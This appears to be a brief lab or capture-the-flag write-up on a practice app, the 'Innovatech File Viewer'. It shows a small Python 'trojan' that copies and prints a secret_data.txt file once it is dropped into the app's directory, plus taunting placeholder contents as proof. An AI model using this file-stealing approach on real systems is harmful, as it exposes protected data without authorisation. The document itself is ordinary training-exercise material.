**Date:** 24thd October 2025
**Target:** Innovatech File Viewer
**Vulnerability:** Trojan Horse

---

## 🕵️ Vulnerability Analysis
By programming a trojan horse in python and moving the file into the directory, I gain access to the data in `secret_data.txt`

## 👨‍💻 Exploitation Steps

1. Create a `.txt` file
2. Write the trojan code in Python in it
```
import os
import shutil

with open('stolen_data.txt', 'x') as f:
    shutil.copyfile('secret_data.txt', 'stolen_data.txt')

with open('stolen_data.txt', 'r') as f:
    data = f.read()
    print(data)
```
3. Convert the file into a python file.
4. Move it into the directory
5. Execute the trojan code.

## 📃 Proof of Compromise

Contents of `secret_data.txt` are - 
```
Loser checking the content through the repo 🤣🫵
bish ahh, Go attack the app 🤣🫵
```